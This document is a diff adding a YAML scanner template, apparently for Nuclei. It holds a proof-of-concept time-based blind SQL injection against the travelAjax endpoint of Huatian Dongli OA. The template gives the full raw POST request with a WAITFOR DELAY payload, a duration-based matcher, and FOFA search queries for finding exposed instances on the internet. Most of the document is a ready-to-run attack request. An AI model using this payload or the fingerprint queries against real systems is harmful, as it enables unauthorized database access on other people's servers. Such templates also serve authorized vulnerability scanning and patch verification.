@@ -1,0 +1,39 @@
+id: poc-aiitzolggq8minbc
+info:
+  name: 华天动力OA travelAjax 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aiitzolggq8minbc
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aiitzolggq8minbc
+    fofa: body="/OAapp/WebObjects/OAapp.woa" || body="/OAapp/htpages/app" || body="/OAapp/WebObjects"
+http:
+- raw:
+  - '注入语句HTML编码
+
+    POST /OAapp/bfapp/buffalo/travelAjax HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+
+    Content-Type: text/html
+
+
+    <buffalo-call>
+
+    <method>getLoanAmount</method>
+
+    <string>1'' WAITFOR DELAY ''0:0:5''-- </string>
+
+    </buffalo-call>'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
